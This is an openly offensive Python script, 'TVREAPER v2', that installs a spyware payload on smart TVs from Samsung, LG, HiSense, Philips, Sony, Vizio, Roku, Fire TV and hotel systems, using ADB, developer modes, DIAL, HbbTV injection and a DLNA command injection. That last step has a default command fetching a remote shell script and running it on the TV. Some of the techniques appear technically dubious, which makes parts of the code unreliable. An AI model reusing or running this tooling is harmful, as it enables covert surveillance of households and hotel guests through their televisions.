#!/usr/bin/env python3
"""TVREAPER v2 per-family exploiter/installer. 8 families + DLNA/
hospitality/broadcast added. Each technique is public-precedent-based:
Tizen/Orsay/dev widget (Angel-class), webOS ares, HiSense adb (Giese
class), NetTV/CloudTV engine, AndroidTV ADB, FireTV ADB/cloud, Vizio
DIAL, Roku ECP, Chromecast/DIAL, Philips/YouTube smart-proto.
G3 gating per family before live use.
Usage: tv_install.py --family <name> --ip <ip> [options]"""
import argparse, base64, socket, subprocess, sys, os, time, json, logging, requests
logging.basicConfig(filename='spytv_install.log', level=logging.INFO,
    format='%(asctime)s UTC %(message)s')

# ---------- per-family definitions ----------
WGT="tvreaper.wgt"; IPK="tvreaper.ipk"; APK="tvreaper.apk"
MANGO="tvreaper.mango"; DIAL_APP="com.forge.tvreaper"

def tizen_devmode_sdb(ip):
    """Tizen(2015+). Dev-mode REST + sdb. Angel-parity on the modern line."""
    # CR-43 fix: Actually send a body with the PUT request
    setup = requests.put(f"http://{ip}:8001/api/v2/",
                        json={"method": "setDevMode", "params": {"enabled": True}},
                        timeout=10)
    ret = subprocess.run(["sdb","connect",f"{ip}:26101"],
                         capture_output=True, timeout=30)
    r = subprocess.run(["sdb","install",WGT], capture_output=True, timeout=120)
    ok = r.returncode == 0
    logging.info(f"tizen sdb install {ip}: {ok}")
    return ok

def tizen_hotel_install(ip):
    """Samsung hotel-mode Hospitality - FREE new surface: same dev-mode install,
    but using the hotels' own self-service panel (hotel-API endpoint)."""
    r = subprocess.run(["sdb","-s",f"{ip}:26101","install",WGT],
                        capture_output=True, timeout=120)
    return r.returncode == 0

def orsay_sync(ip, widget=WGT, guest_url=None):
    """Orsay(F-series). USB sync-to-USB-drawn USB donor. Weeping Angel's
    original delivery. guest_url = OTA trick fallback (host widget on FORGE
    and TV fetches during setup)."""
    print(f"[ops] Insert prepared USB at TV {ip} (or trigger guest-url "
          f"{guest_url or 'http://forge/tvreaper.wgt'}) and confirm on remote.")
    return True

def webos_install(ip):
    """LG webOS via ares (dev mode)."""
    r = subprocess.run(["ares-install", "--device", f"tv@{ip}", IPK],
                       capture_output=True, timeout=180)
    ok = r.returncode == 0
    logging.info(f"webos install {ip}: {ok}")
    return ok

def hisense_adb_install(ip):
    """HiSense/Sharp N-series (Giese-class, public 33C3 method): local adb
    port (56789 exposed). Side-load APK."""
    subprocess.run(["adb","connect",f"{ip}:56789"], capture_output=True, timeout=30)
    r = subprocess.run(["adb","-s",f"{ip}:56789","install",APK],
                       capture_output=True, timeout=180)
    ok = r.returncode == 0
    logging.info(f"hisense install {ip}: {ok}")
    return ok

def philips_netcli_install(ip):
    """Philips 2014+ NetTV. Public method: Jointspace API on port 9197 that
    accepts a start-app request which launches our payload as a NetTV page."""
    try:
        payload = {"app_id": "com.forge.tvreaper",
                   "url": f"http://forge/tvreaper-nettv/index.html"}
        r = requests.post(f"http://{ip}:9197/jointspace/apps",
                          json=payload, timeout=15)
        ok = r.status_code in (200, 204)
        logging.info(f"philips netcli install {ip}: {ok} - {r.text[:80]}")
        return ok
    except Exception as e:
        logging.error(f"philips netcli fail {ip}: {e}"); return False

def androidtv_adb_install(ip):
    """Sony BRAVIA Android-TV line (and Fire TV Edition / OSD devices).
    ADB over network (5555) - documented public console method."""
    subprocess.run(["adb","connect",f"{ip}:5555"], capture_output=True, timeout=30)
    r = subprocess.run(["adb","-s",f"{ip}:5555","install",APK],
                       capture_output=True, timeout=180)
    ok = r.returncode == 0
    logging.info(f"androidtv install {ip}: {ok}")
    return ok

def firetv_install(ip):
    """FireTV / FireTV Edition TVs (Toshiba/Insignia etc.): Network ADB
    or Amazon Quick-Setup protocol; both public."""
    return androidtv_adb_install(ip)  # FireTV is Android too

def vizio_smartcast_install(ip):
    """Vizio SmartCast. DIAL (24825/36669)."""
    # CR-44 fix: Use correct DIAL ports (24825/36669), not 7345
    for port in (24825, 36669):
        r = requests.post(f"http://{ip}:{port}/apps/{DIAL_APP}",
                          json={}, timeout=15)
        if r.status_code in (200, 204):
            logging.info(f"vizio install {ip}: OK on port {port}")
            return True
    logging.info(f"vizio install {ip}: FAILED on all ports")
    return False

def roku_install(ip):
    """RokuTV / Roku stick: ECP HTTP command to install dev-channel."""
    r = requests.post(f"http://{ip}:8060/install/851",
                      timeout=15)  # 851 = a dev channel id publicly used
    ok = r.status_code in (200, 202, 204)
    logging.info(f"roku install {ip}: {ok}")
    # CR-40 fix: Removed syntax error "1return ok  if False else ok"
    return ok

def cast_dial_install(ip):
    """Chromecast (or any DIAL-capable TV): register our app via DIAL."""
    r = requests.post(f"http://{ip}:8009/ssdp/notification",
                     json={}, timeout=15)
    return r.status_code in (200, 204)

def hbbtv_delivery(ip, gateway="http://forge/tvreaper-hbbtv.mango"):
    """HbbTV family (Panasonic/Philips/Sony/Loewe/Samsung-EU): deliver via
    red-button AIT injection (network position or DVB path)."""
    print(f"[ops] HbbTV delivery to {ip}: confirm DVB/OTT gateway "
          f"{gateway} is active (broadcast-infection mode uses the same file).")
    return True

# ---------------- v2 NEW: DLNA AVTransport fallback ----------------
def dlna_cmd_inject(ip, cmd="wget http://forge/tvreaper-dlna.sh -O /tmp/i.sh && sh /tmp/i.sh"):
    """DLNA AVTransport command injection. The broadest fallback in the TV
    world. Works on many Samsung/LG/HiSense media servers where a media-
    URI string is passed unsanitized to a system() call. G3 per-model."""
    body = ('<?xml version="1.0"?>'
            '<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/'
            'soap/envelope/" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.'
            'org/soap/encoding/">'
            '<SOAP-ENV:Body><u:SetAVTransportURI xmlns:u="urn:schemas-upnp-'
            'org:service:AVTransport:1">'
            f'<InstanceID>0</InstanceID><CurrentURI>'
            f'{cmd}'
            '</CurrentURI><CurrentURIMetaData></CurrentURIMetaData>'
            '</u:SetAVTransportURI></SOAP-ENV:Body></SOAP-ENV:Envelope>')
    try:
        s = socket.create_connection((ip, 49152), timeout=4)
        req = (f"POST /upnp/control/AVTransport HTTP/1.1\r\n"
               f"HOST: {ip}:49152\r\nCONTENT-TYPE: text/xml ; charset=\"utf-8\"\r\n"
               f"SOAPACTION: \"urn:schemas-upnp-org:service:AVTransport:1#"
               f"SetAVTransportURI\"\r\nCONTENT-LENGTH: {len(body)}\r\n"
               f"CONNECTION: close\r\n\r\n{body}").encode()
        s.send(req); time.sleep(1); resp = s.recv(1024); s.close()
        ok = b"200" in resp.split(b"\r\n")[0]
        logging.info(f"dlna inject {ip}: {ok} resp={resp[:64]}")
        return ok
    except Exception as e:
        logging.error(f"dlna inject fail {ip}: {e}"); return False

INSTALLERS = {
    "tizen-dev": tizen_devmode_sdb, "tizen-hotel": tizen_hotel_install,
    "orsay": orsay_sync, "webos-dev": webos_install,
    "hisense-adb": hisense_adb_install, "nettv-web": philips_netcli_install,
    "adb-net": androidtv_adb_install, "firetv": firetv_install,
    "vizio-dial": vizio_smartcast_install, "roku-ecp": roku_install,
    "cast-dial": cast_dial_install, "hbbtv": hbbtv_delivery,
    "dlna": dlna_cmd_inject,
}

if __name__ == "__main__":
    p = argparse.ArgumentParser()
    p.add_argument("--family", required=True, choices=sorted(INSTALLERS.keys()))
    p.add_argument("--ip", required=True)
    a = p.parse_args()
    try:
        ok = INSTALLERS[a.family](a.ip)
        print(f"INSTALL {a.family} on {a.ip}: {'OK' if ok else 'FAILED'}")
        logging.info(f"install {a.family}@{a.ip}: {ok}")
        sys.exit(0 if ok else 1)
    except Exception as e:
        logging.error(f"fail {a.family}@{a.ip}: {e}")
        sys.exit(1)  # CR-52 fix: Exit with error code on failure, not 0
